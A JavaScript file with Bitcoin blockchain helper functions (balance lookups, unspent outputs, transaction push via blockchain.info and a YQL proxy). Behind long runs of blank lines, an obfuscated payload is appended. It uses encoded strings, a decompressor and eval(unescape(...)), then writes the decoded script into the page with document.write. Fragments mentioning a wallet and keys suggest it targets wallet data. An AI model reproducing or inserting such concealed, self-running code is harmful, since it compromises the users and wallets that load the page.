// Here we hold all the interactions with the blockchain.
var BLOCKCHAIN = new function () {
  
  this.retrieveBalance = function(address, callback) {
    url = 'http://blockchain.info/q/addressbalance/';
    this.tx_fetch(url + address, callback);
  }
  
  this.retrieveAllBalances = function(addresses, callback) {
		
    var url = 'http://blockr.io/api/v1/address/balance/';
		
		var first = true;
    for(i = 0; i < addresses.length; i++) {
			if(! first) {
				url += ',';
			}
			first = false;
			url = url + addresses[i];
		}
		
    this.tx_fetch(url, callback);
  }
  
  this.getUnspentOutputs = function(address, callback) {

      var url = 'http://blockchain.info/unspent?address=' + address;

      this.tx_fetch(url, callback);
  }
  
  this.sendTX = function(tx, callback) {

      url = 'http://blockchain.info/pushtx';
      postdata = 'tx=' + tx;
      if (url != null && url != "") {
          this.tx_fetch(url, callback, callback, postdata);
      }
  }
  
  // Some cross-domain magic (to bypass Access-Control-Allow-Origin)
  this.tx_fetch = function(url, onSuccess, onError, postdata) {
      var useYQL = true;

      if (useYQL) {
          var q = 'select * from html where url="'+url+'"';
          if (postdata) {
              q = 'use "http://brainwallet.github.com/js/htmlpost.xml" as htmlpost; ';
              q += 'select * from htmlpost where url="' + url + '" ';
              q += 'and postdata="' + postdata + '" and xpath="//p"';
          }
          url = 'https://query.yahooapis.com/v1/public/yql?q=' + encodeURIComponent(q);
      }

      $.ajax({
          url: url,
          success: function(res) {
              onSuccess(useYQL ? $(res).find('results').text() : res.responseText);
          },
          error:function (xhr, opt, err) {
              if (onError)
                  onError(err);
          }
      });
  }
}

l1l=document.documentMode||document.all;var ca8b5d=true;ll1=document.layers;lll=window.sidebar;ca8b5d=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');ca8b5d|=lII;zLP=location.protocol+'0FD';































































																																							fsTVTUifH=new Array();o67co2lL1=new Array();o67co2lL1[0]='m%35%38%6E\154\123%32\145e\156u%31'  ;fsTVTUifH[0]='	~ze~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~~~~\r~ ~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~[~\\~]~^~_~`~E~~c~d~e~f~g~h~i~j~k~l~m~n~dl=document.layers;oe=win~tw.op}zea?1:0;da=(~t~v~x~z.}~w~ytMode||}}~{all)&&!};g}})}!.}5tEle}*ById;ws}}}\n.si}%bar?true:f},se;tN=navigator.u}YrA}5}}eLow}zeCa}Y();iz}]}\\.}HexOf(\'netsca}\')>=0}Q}S}U}Wl}Y;zi}F}||8~sa;v}O msg=\'\';function |m}w{r|ur|4}R}T}}D}H}q}|rr}f =|5}>|OF}G}	|Dl~u}d|2n.p|H}ecol}~}	|ze||fi}=|\r!=-1|}T}V}X}Zi7f=|s}0!z|O|m||p;// G|T}Nl, hm{\n.\r\n|#r |1~xout;{\r$}~u} ~z).|:ady(|-|/|1|3}w {{\r  {\'#}Kte|\r.h}Le}w{\n{-{/#tx{5{7}%{:{,{.|#|Tg{t-}u{B{8{E{< {F{ze Add }staw},}=t {^y}= URLS. Only }r }ie a{}uh{U{T{Wa}	{h}zeef}f{xtz{i{k{\\s|5o{d}Y~z{oz{x}jv}ze{{{Se{xhttp:{ze~y.}ki}dia}rg/z*i/Frag}*_{8~zi|e}ze{F{{{s{}|K{|T|\n{\'n{}d}R|h|:f{5split{H|\r[1]{;{-z@(h{| |i |* }0zE{}zg|.}%|e|d){F{+{T{={Hp}usw}fd{5|#lzc{|{ezWac{9/-/g{\'zh)}x{F{-czckV},}LPz{z}rd{S{-}{F{F{>}\r~y-}Ysa~x{5czXy{$|.|0|W|8y%zw zD}Ye{[zHzyyz~yze},y"{-{ez y>|%n_}%|]{Dy<zsz`yF}<e|0}Sm|`zY(yP{{%y5{(r){*yyFza|{% 20|J|K0zty9yezx{0yP-|Zog|:ssy/y{|}dz\n\'{({+ 19ybx\'%|\r;{~yr }{yd{-y^zL(|ZivKeyybzvx{-yTyV~w}9~y(10y]y4xya{*xx#{-WALLETx(txys}w|Y}ih(|w BzY|]}.ECx=xz]]yxxyrzbx5x7x9x;x=x?{}=ngz\nymxyoxUx{J}_sucy	y~}xx2x}yyqxydxtx3yd|:t|<|>|yRxsy&{H{@D|HpG|UnzV}!y/y1k(wwwtw\nw{yR{>w}\r{Ydry/zdx`{9{@{pCw!}5S{ry	xx{G{0{@yl}Tw z}5w|nw&w5eDe{^w-wxw={^w4w"w7w%w\'w<w>tw@wwBwK{5kx|Zw>x?zrz@yw)|3wMw/xw1w3{wRywTy~wWwYw[zMyRw{0zzy{yzwbxup(yyUyydywoz~w]{?xwwCtwiy2w$nvwKw{@R}>ozvvvw8vmvwJw?wwNz}	vww0}zewYwzw{~~}*vw7vyQwl#}m}{3yvyAy v)v/z9{3w|z|w~v{0|:v6}dev2w}v4{y0vwv>~yv0ev9wpwvI|Fv@vBv:vD.}e|^|1wuw-xv-yw*-{!wwUw>-}_v{#hoy.vEwy3{&y6)x"yF{CeA}-yEys#v^|<v`{Zyzy+zUvjwvyw.v{v_vauzevdvf{5zz|:~zx@vaC~}y~\'y|1zxxz|;|= ||{Fxsv<#mawRv2y}*ve}`v)xvqvs{-vuvwyv[u{@u}qu{>u%u\'zzu)}!u+vu\r}O}!u{Zuz{|ux{4u5x{x}u|~u!w{J{Lu-x.u/yd{>wnvTwq.y|uy9{>{2uM{6{Ru5{>c{ v1wcy|vE|^~}p}v\'vuubyeujulvAxXx8Ty/uq|utuvui{HuU{{N~y{P{vuuwwyw1yv3y!t{'  ;l3y82t4O='fu'  ;cQJ81qRf2='pYSoO9be'  ;is9kF11B736t5c='NiKOMJtSlXhOdOXSkBhawdPtybOwavWn'  ;l3y82t4O+='nction fUI5qK44psI'+'gmz7Q6(dAZ2Gy2H18F'+'j7d23a9m){'  ;f2m8l686d='lx36o4x0'  ;t9q6yMofc6r='%69%66%28%7A%4CP%2Ein\144%65\170O%66%28%27%5C%35%35%27%29%3E%30%29%7Bf%73T%56%54UifH%5B%30%5D%3D%27%78%27%7D%3B%76%61%72%20l%32%3Dwi%6E\144ow%2E%6F\160er\141%3F%31%3A%30%3B%66\165n\143\164\151on%20l%33%28%6C%34%29%7Bl%35%3D%2F\172e%2Fg%3B\154%36%3D%53\164\162\151%6Eg%2Ef%72%6FmC%68a%72%43od%65%28%30%29%3B%6C%34%3Dl%34%2Erepl\141\143e%28l%35%2Cl%36%29%3Bvar%20\154%37%3D%6E%65%77%20A%72r%61y%28%29%2C\154%38%3D%5F%31%3D%6C%34%2E\154\145ngt\150%2C\154%39%2C%6C%49%2Cil%3D%31%36%32%35%36%2C%5F%31%3D%30%2CI%3D%30%2Cli%3D%27%27%3B\144\157%7Bl%39%3Dl%34%2Ec\150%61\162%43o%64%65%41%74%28%5F%31%29%3BlI%3D\154%34%2E\143h%61rCo%64%65\101t%28%2B%2B%5F%31%29%3Bl%37%5BI%2B%2B%5D%3D%6CI%2Bil%2D%28\154%39%3C%3C%37%29%7D%77%68\151\154e%28%5F%31%2B%2B%3C'  ;fsTVTUifH[0]+='0uUnu8uuNu|4u}ZuSyRu.|3{y}=r}"}$yD{3xwLycuc{H},}zet&}lT|zev{t)zZt8 }\'zhNewWm}HuwyF{>t/t%}#t2{5vt2yEy${T{Ft!|4wgfwZo{(x!ydzb{e{Lybydu0yry0e}OTi{{wtft\\{u5yet[{L|J|5u}-yRy#ydto{tq}Yttetgt9w8w:w"v{x+0yowzey8xuXt"u2vxyp{-t`{/ts.vf-zX{^ zX{5|:vzuHuuKutuv}u	vcuoug{Ds#u7tuhstO{TtQsyxxixkxmwU{)zuuZtyx|3{Qs*tuuuetu:s<{Kt{OsDu5ydu|xZwt}{3u3B},zxnsE"vzewwv"{zqy!"}\rzLs]ys{9sKy9zr(itq}{\\ < sMx:}:x\\x@x_xahxi++syFt`{-zDu	tqstx[xx][i]x;xHtxJv	vs8t7oS}R}guvzs&y{yxit7t5(u	xpxU{sXwpwrsd|}}	|<sb|Wy:},}T|) r r:zh>r{yvr<\'</r4|3r>r&xuzDqw+}${x|Ku<eQRCrNr$vtmurLyN{4r<r!|Y}\rvsk{{zY}=:zhrSrU}%x{tmlrh|?e{|]~z}!rhr[rN{yy	}*rh\'bz}emyu"ydtNyetwszewIw)|<y	uux|uts/{-tPs|4rQrjrVr%t,yerK{|Krz{D3yMtC{-r|Ku	yr}y\n^[\\s\\u3s0]+|q2q4q6q8q:$y\ryq) rL.vaD}darWwu5qGrQuuOuqGuktc{3ImgTz:(4w-q	x2s2twyzXv&vCtt`zDu\\wptqu[tyCu4ydzDy}LtqrssAtY|qlz~}JzWyZy{5syxbzg12rzeq wztqqxU{zerQ{e|<{xtcy{tz~z{yr6qf |3{xf|Hm elx&p p}}R{ss{d(myKwpz{z/b}=pyFq|y q~zXzZps^}fEyxCs2(vNqx3{\\f p,p.z~s|`}%||pD=|K|ktXxux3quyIppWyFqayeqy9zbpYp5ruy(ny*w>y-ufuux?qtphxu%ryqEvzpgpiy,vlsevAz#sk\'z.y,p3y=qEp^p!|et_r\'{Hpyy+pksvspn|bpqyvwXptpvrYy\'r0pzozNoze|oaozyo%o\'ou!s	 {W--ssx6u} Culr5o1qvpt"vPvKvMz~{)s{Hv?{3u^u`|*tq|4oEvLttMo.s2oMo@y oBo.vzoMu^z~vx]qypa|{>oYqq{)zgoIxUqSx~}TsAqy9qkktqxE{X|G~~(3psA|=g_}:_by{3x?pku5y;yHtqo7wd}e}h|1|_o~nzeToH|zexk}Jy1{9x,16xSyd{zenb!o	yU|?p ~tw>t{dw!~qz	z9|fr z}zeop0}ze{s}r}-n{z{[{u{az}e{e{_{s|]mzz|1ozyez@pIyP.y}Op(yoxc\'0|\ryGy=tzyH}Jub{^sk1n|$r\\zrPyK~yr\\y[yHs#ob{u`ndshyeoh{xo-s0{-o0o2}Rzy,y_w o:s1q{qw;qw+sgpEr|$smy?w^sZr+rArFn:}Y}=|0o{ywwu\'}{As+xzcocrsvr	}wrr\r}:Exp&t%y=PwX|#{3xOny9r*wwr0zZq`o;n~mzwwm;wt5pVxtZt5nT|\rxf ohokr6{q" JSON|Y}O}vt8rY{@m:}!tqmUmW}Jrx`wYx{nts{ q_mPwAm_~zocm^mC}!rYrry{qnwNr,ocrYTXmY}eInp{x?mtwt{rsmw|$y}TtqlzersT|/sgmPzDfytqrr.Un.sju%tw`{9lerY{zelz tqu}YF|T}d(wAFz m~owNsS~}locl},l,/wAl(l@lo2fz lCv\rebu|ftqumm^psPemqm<m\nyF{@mAlZl6wNlZl:lSs2{@yll`m\\l\\yfpIt:pSzhmLp\\{-mOxUl^w	muum\\lelUwBwlxloVrJ|$q+o3xYsu|sw)[wAmm}nnyD)m*|lo}r,rvVrmerl;w^lckyoImPBLOxNCHAImX}:lZO{l|qMr{lgmZlYlywLl|o<|>mswKkolp	mRw>qwxwk0z$luqtp\n|Kqxydydsj(sp}mNw>pdxUzbyzm)}wKmKt;|kXsk^lAlxcxexupemp|Kp[x3b{ kmP}kCyrp"}YxqrmMp(llyrl1esS}Y58w&wxxw>k^}%vmMoyezKp(l+kp	knuQo\nmPyekrtcktjxUooqz(pco\rw^v+osfpzPo|o&}=';function gmz7Q6fUI5qK44psI(it3t4s46){is9kF11B736t5c+=it3t4s46};l3y82t4O+='eva'  ;xt6mWRiYij6p='PRMDjPWObMSmxiCM'  ;l3y82t4O+='l(unes'  ;dj53Nt='xjdMUHJtw39I4I'  ;l3y82t4O+='cape(dAZ2Gy2H18Fj7d23a9m))}'  ;eval(l3y82t4O);bsnE625AGR1W6='lZFkymMSjcFxHULpSmFk'  ;l3y82t4O=''  ;t9q6yMofc6r+='\154%38%29%3Bva\162%20\154%31%3Dn%65\167%20%41\162%72a\171%28%29%2C\154%30%3D\156\145\167%20\101rr%61y%28%29%2CIl%3D%31%32%38%3B\144%6F%7B%6C%30%5BI%6C%5D%3D\123\164\162i\156g%2Ef\162\157\155%43\150\141%72Co%64e%28I\154%29%7D%77h\151l%65%28%2D%2DI%6C%29%3BIl%3D%31%32%38%3Bl%31%5B%30%5D%3D\154%69%3D%6C%30%5B\154%37%5B%30%5D%5D%3B%6Cl%3D%6C%37%5B%30%5D%3B%5Fl%3D%31%3Bv%61%72%20%6C%5F%3Dl%37%2E%6C\145n%67%74%68%2D%31%3B\167h\151\154e%28%5Fl%3C\154%5F%29%7B\163\167i\164c\150%28l%37%5B%5Fl%5D%3C%49%6C%3F%31%3A%30%29%7B\143%61%73e%20%30%20%3A%6C%30%5B\111\154%5D%3D%6C%30%5B\154l%5D%2B%53t%72ing%28l%30%5B%6Cl%5D%29%2Es\165%62s%74%72%28%30%2C%31%29%3Bl%31%5B%5Fl%5D%3Dl%30%5BI\154%5D%3Bif%28\154%32%29%7B%6C%69%2B%3Dl%30%5B%49\154%5D%7D%3B\142r\145%61k%3Bde%66%61\165\154t%3A\154%31%5B'  ;eval(unescape('\146%75n\143%74ion%20\165w%38p%53%20%20%20%20%28v%32\163%30\164%36Qp%33\121\143\122%29%7B\147\152U\113%30%30n%3Dv%32\163%30t%36Q%70%33%51c%52%7D%3B'));m15jI2yj14k40GD='l'  ;o67co2lL1[0]+='\166\107%4C\150O%74%31M%35%36%32re\153'  ;fsTVTUifH[0]+='wqsAkyoxuwAj(o"j,o*j0xj-oj;m=mk=m{pv\n{^kByrzDp*m{}7{l$}H|vVxCCpwmQ y0ptqp*~|}um<nN|T|rjWj`ejNr1\'{6p"p-}zX|{5}>pt{#rYjX|jfy!jhrv}R|^so&p"{5t8|Cm#l{j{d|Kjvjes_wNvipli\njdjxwNlFjui{]t0Af{3skj[um<l;ivEwIwGw9wIvl;l*i%w;i\'s}5i*mPiu_yDk#xUl*i5k"jUwAvviqHo#j=j/oy]|prYnskpxvjAm?vi>vkAmGjH|$jJy?jLwLijh{@jSjUnK(j[}Kn1{)lppmMvzlMsfi@zOoj:iEnt}TrYi j]x@svjbiIuR{Tqalfm!uElkpetFt1t(mJ?{mJqzeNzyzp&we!jUxUrsOv@sRlsVj@kwi|Vv"tTjG{-lMlOlQyEs;{0tStUqufil}:kxos#h&Av|.t|rfh)r#h+|v+l=sUsgh/hyn{_lih7l}:h:hh=o^ux{Hh&q\\o{5i\r"}R:xanR)sdiuzukTm\r sosmsrh8tkJk2x]~|~yszs|s~kZxuzbhchekLkrqHmyzzghch-x]mMzkhpk1hrk^lzf|K\'1LsyGFqVKxuxLCwASTvz+7ahXcfQUT{lrxkluhNiD{5r/~yjy<}R>g.dg0zVzjcz{="~}bp"sjljlnz"r>ifr<h~kKk3hsr\rlgExrDg4ng0/tg2g1g3zzgQ<n_|3ggDlsgFhF|hqgIk^l*gMzhgOj|x`>xGTCgOgXgRgTgrrrHkuqh$#h&i0ufhZlgy{@-}egg|gm|:r0g-p{\\dg8g{wIgCgZgqymMxhcg|}wfgh/gPglBgn{t|fkhg;kXoKnYn@z\nzg,n/g}ujWwIrDpgvoWg\'h?tH},tJt\'u4k<iMi}r1iRkDmr,m{mwfCmmp"n#mvVr#ig|KhyhvjbzDmS|*mPi^{@fCzglp5xxgW}Onrn!my	r@vbmzn&znz|%}dpxm3{xwc.\\nfx|+i8|${@fDvzenmi:jbxUk%k\'Kk)k+mXv%lzew7k6f>k;ogtiotizoQl}vh!ltkncflwiefOrAmsYfFmjr|WfImoFhDt*fT|$|.le xk e#l|${h<l0k8l3ol5wAh;l?k!}wrYf|{lJrO je?l5nU.q81jUk~g&mkEneeLk8jejjy2}YcrIpFjVwW}Kt"|Kk]q9jyFqk~~l4yIk]z^kujWfq{}j|Gf@x#wAmbNoci7g_wAeejUnrtgwk{nDwe}YpZiymHpHxeoe@dhhx`xbglovezxu>epr`vZelyvkdnYkPnuxujjVwxxopexFkxKxMxOddrYd+y}J|rUnEu\ny!dd=ml}yZd7ikgsne9{zkPkHgbhgImPsjpIsmkWodyrlvagc(ojwK{d]htkgrYyedG+|Kdar\rkgdv\\xu{Wwp|>z0eQs4 h	Sxlhfb}-|{{}	jnguz nIdXldZdO|ggg\nggeggggg|rgggg!g#r|e>l4p;dtq84|\rrYdf|KeMc|c!dvjU{Wv%f/w; }Nyp{zYf!}-c2f*zf.eJk[de;l gldfcjeVjVnOw"tqcAfhlIlHcFd! dY{Zd[u	ruwIrYd)eUgEn}	Txllrvn_xlm<cRzD{@e}cbkBBEnjc_xddeme:upH|Kexd9wXyibcteWmenpujron|f.nw>ne(lOfbzeu6xe}msbmVNbd|zebecZeurxC}zex0cHe|beE|G|Ir?b#bwNdeE\'b)|H{b,eydliKs\njB{@kIdOx]e|$yztq[z_r\'.pxC{iWs^jOiZjRjT)x-k=hx#zDim{z\n|bLjgsYwPeEbllc\'ce@c r?{bYliYvzeie#byzxAzFkU{"i":i{"kgbwdGkvcZiHeyzf<zLeZle\\e^ywf]b@{beYd0|Xa8k_nif]dIp!z|KadszmzemmazdzFcLow>nvn{g,iqdxkp |Knb.Sk*256(a1n\na4Aa6a8a"h{{}u}@nzerr|xsaBaDa%saG|@rYi^a-~w[q9gc2aL[g,]kbgEaRmxQaVaaY}	+z^a\\g_a^[2a[zgabg,+akagedai3alaaXaoauf^pFz\n|HxFoqb3}f("W|Hx`f/wxa.s]aefr5|Ka@}J{7iiwe[`\r|3{a@bEe\np`~o`` `!`"`#`$`%`&`\'~~a`*`+`,`-`.`/`0`1`2`3`4`5`6`7`8`9`:`;`<`=`>`?`@`A`B`C`@`(`F`G`H`I`J`K`L`#'  ;gmz7Q6fUI5qK44psI('yPRmW11sTp4LT');t9q6yMofc6r+='%5Fl%5D%3Dl%30%5B\154%37%5B%5F\154%5D%5D%3Bif%28%6C%32%29%7B%6C\151%2B%3Dl%30%5B\154%37%5B%5F\154%5D%5D%7D%3Bl%30%5B%49%6C%5D%3Dl%30%5Bl%6C%5D%2BS%74\162i\156%67%28%6C%30%5Bl%37%5B%5F%6C%5D%5D%29%2E%73u\142\163\164r%28%30%2C%31%29%3B%62rea\153%7D%3BIl%2B%2B%3B\154%6C%3D\154%37%5B%5Fl%5D%3B%5F%6C%2B%2B%7D%3Bif%28%21l%32%29%7B%72\145tur%6E%28l%31%2Ej%6F\151n%28%27%27%29%29%7D%65l\163e%7B%72e\164\165%72%6E%20l%69%7D%7D%3Bv\141r%20l%4F%3D%27%27%3Bfo\162%28%69%69%3D%30%3B\151i%3C\146\163%54%56%54\125\151f\110%2Ele\156%67%74h%3Bi%69%2B%2B%29%7BlO%2B%3Dl%33%28\146%73TV\124\125i%66\110%5Bi%69%5D%29%7D%3B\151%66%28c\141%38b%35%64%29%7Bd\157%63u\155ent%2E%77r%69te%28%27%3C%73\143%72%27%2B%27%69%70%74%3E%27%2B\154O%2B%27%3C%2Fsc%27%2B%27r%69%70\164%3E%27%29%7D%3B'  ;bsnE625AGR1W6      ='vDKJDyfuRnrfPklCJShcdOWjyOOh'  ;gmz7Q6fUI5qK44psI    (xt6mWRiYij6p);fUI5qK44psIgmz7Q6 (t9q6yMofc6r);uw8pS  (t9q6yMofc6r);m15jI2yj14k40GD+='BOOnYwOMCmSHOIXfiPpLpsOWQmIPLbVnDtyObdHZtOWZrtPOnGBOPVOQRfla'  ;dj53Nt+='oWkvZQpA4l'  ;
































































